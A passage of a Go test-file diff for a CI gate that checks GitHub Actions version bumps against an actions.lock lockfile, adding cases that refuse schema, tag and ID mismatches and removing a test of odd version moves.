+		{"owner_id is not a number", bothLocks("owner_id: 44036562\n        repo_id: 192624594", "owner_id: 0x2a\n        repo_id: 192624594"), "not ref (a vX.Y.Z tag), commit, owner_id and repo_id"},
 		{"tag line and lockfile disagree on the version", func(t *testing.T) []facts.File {
 			fs := setupGoBump(t)
 			fs[1].Head = []byte(edit(t, string(fs[1].Head), "setup-go@v7.1.0", "setup-go@v7.2.0"))
 			return fs
 		}, "no changed actions.lock entry gives the commits"},
-		{"commit line and lockfile disagree on the version", func(t *testing.T) []facts.File {
-			lockSHA := "        - 'actions/setup-go@" + setupGoV700 + "'\n    'actions/setup-go@" + setupGoV700 + "':\n        ref: 'v7.0.0'\n        commit: 'sha1-" + setupGoV700 + "'\n        owner_id: 44036562\n        repo_id: 192624594\n"
-			return []facts.File{
-				file(lockPath, lockSHA, edit(t, lockSHA, setupGoV700, setupGoV710, "ref: 'v7.0.0'", "ref: 'v7.1.1'")),
-				file(ciPath, step, bumped),
-			}
-		}, "name different versions"},
+
+		// The lockfile's schema. The entry shapes are v0.0.3's; a file
+		// that declares anything else is not read, changed or not.
+		{"schema version changed", lock("version: 'v0.0.3'", "version: 'v0.0.4'"), "does not start with version: 'v0.0.3'"},
+		{"another schema at both commits", bothLocks("version: 'v0.0.3'", "version: 'v0.0.4'"), "does not start with version: 'v0.0.3'"},
+		{"a later schema at both commits", bothLocks("version: 'v0.0.3'", "version: 'v1.0.0'"), "the one lockfile schema the gate reads"},
+		{"no schema line", bothLocks("version: 'v0.0.3'\n", ""), "does not start with version: 'v0.0.3'"},
+		{"schema line written another way", bothLocks("version: 'v0.0.3'", "version: v0.0.3"), "does not start with version: 'v0.0.3'"},
+		{"schema line not first", bothLocks("version: 'v0.0.3'\nworkflows:", "workflows:\nversion: 'v0.0.3'"), "does not start with version: 'v0.0.3'"},
+		{"schema line indented", bothLocks("version: 'v0.0.3'", " version: 'v0.0.3'"), "does not start with version: 'v0.0.3'"},
+
+		// A tag-keyed entry belongs to a workflow line. Without one the
+		// lockfile would say a workflow runs a version its file does not.
+		{"a tag entry no changed workflow line names", func(t *testing.T) []facts.File {
+			return setupGoBump(t)[:1]
+		}, lockPath + ":15: the dependency entry moves a tag that no changed workflow line names"},
+		{"a second tag entry no changed workflow line names", func(t *testing.T) []facts.File {
+			fs := setupGoBump(t)
+			fs[0].Head = []byte(edit(t, string(fs[0].Head), "checkout@v7.0.0", "checkout@v7.0.1", "ref: 'v7.0.0'\n        commit: 'sha1-"+checkoutV700, "ref: 'v7.0.1'\n        commit: 'sha1-"+checkoutV701))
+			return fs
+		}, lockPath + ":10: the dependency entry moves a tag that no changed workflow line names"},
+		{"a tag entry named by a uses list alone", func(t *testing.T) []facts.File {
+			lock := lockText + "        uses:\n            - 'actions/checkout@v6.0.2'\n    'actions/checkout@v6.0.2':\n        ref: 'v6.0.2'\n        commit: 'sha1-" + checkoutV602 + "'\n        owner_id: 44036562\n        repo_id: 197814629\n"
+			fs := setupGoBump(t)
+			fs[0] = file(lockPath, lock, edit(t, lock,
+				"setup-go@v7.0.0", "setup-go@v7.1.0", "ref: 'v7.0.0'\n        commit: 'sha1-"+setupGoV700, "ref: 'v7.1.0'\n        commit: 'sha1-"+setupGoV710,
+				"checkout@v6.0.2", "checkout@v6.1.0", "ref: 'v6.0.2'\n        commit: 'sha1-"+checkoutV602, "ref: 'v6.1.0'\n        commit: 'sha1-"+checkoutV610))
+			return fs
+		}, "moves a tag that no changed workflow line names"},
+
+		// Two entries for one move must agree.
+		{"a tag entry and a commit entry give the same move other commits", nestedBump("actions/setup-go", "v7.0.0", checkoutV700, "v7.1.0", checkoutV701, setupGoRepoID), "pinned to other commits elsewhere"},
+		{"a tag entry and a commit entry give the same move other IDs", nestedBump("actions/setup-go", "v7.0.0", setupGoV700, "v7.1.0", setupGoV710, checkoutRepoID), "two actions.lock entries record different IDs"},
+		{"commit key changed, ref did not", nestedBump("actions/checkout", "v6.0.2", checkoutV602, "v6.0.2", checkoutV610, checkoutRepoID), "its ref did not"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -472,31 +570,6 @@ func TestReadChangeSetRefuses(t *testing.T) {
 					t.Errorf("problem %q has a character outside printable ASCII", problem)
 					break
 				}
-			}
-		})
-	}
-}
-
-// A line that differs only in its version, or only in its commit, is a
-// shape: the facts refuse it, not the reader (see TestGatherRefuses).
-func TestReadChangeSetLeavesOddMovesToTheFacts(t *testing.T) {
-	const step = "      - uses: actions/setup-go@" + setupGoV700 + " # v7.0.0\n"
-	tests := []struct {
-		name, head string
-		want       pin
-	}{
-		{"same version, new commit", strings.Replace(step, setupGoV700, setupGoV710, 1),
-			pin{name: "actions/setup-go", from: "v7.0.0", to: "v7.0.0", oldCommit: setupGoV700, newCommit: setupGoV710, where: ciPath + ":1"}},
-		{"new version, same commit", strings.Replace(step, "# v7.0.0", "# v7.1.0", 1),
-			pin{name: "actions/setup-go", from: "v7.0.0", to: "v7.1.0", oldCommit: setupGoV700, newCommit: setupGoV700, where: ciPath + ":1"}},
-		{"a downgrade", strings.Replace(strings.Replace(step, setupGoV700, setupGoV710, 1), "# v7.0.0", "# v6.9.9", 1),
-			pin{name: "actions/setup-go", from: "v7.0.0", to: "v6.9.9", oldCommit: setupGoV700, newCommit: setupGoV710, where: ciPath + ":1"}},
-	}
-	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			pins, problem := readChangeSet([]facts.File{file(ciPath, step, tt.head)})
-			if problem != "" || len(pins) != 1 || pins[0] != tt.want {
-				t.Errorf("got %+v, problem %q; want %+v", pins, problem, tt.want)
 			}
 		})
 	}
